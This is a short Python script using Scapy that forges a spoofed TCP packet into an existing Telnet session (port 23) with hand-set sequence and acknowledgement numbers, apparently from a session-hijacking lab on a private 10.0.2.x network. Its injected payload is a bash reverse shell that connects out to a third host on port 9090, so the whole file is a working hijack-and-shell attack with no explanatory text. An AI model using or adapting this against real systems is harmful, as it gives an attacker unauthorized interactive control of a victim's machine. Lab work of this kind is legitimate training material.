#!/usr/bin/python
from scapy.all import *
ip = IP(src="10.0.2.6", dst="10.0.2.5")
#flag = ack + psh = 0x018
tcp = TCP(sport = 57936, dport=23, flags=0x018, seq=2253350212, ack=756082469)
data = "/bin/bash -i > /dev/tcp/10.0.2.4/9090 0<&1 2>&1\n"
pkt = ip/tcp/data
send(pkt,verbose=1)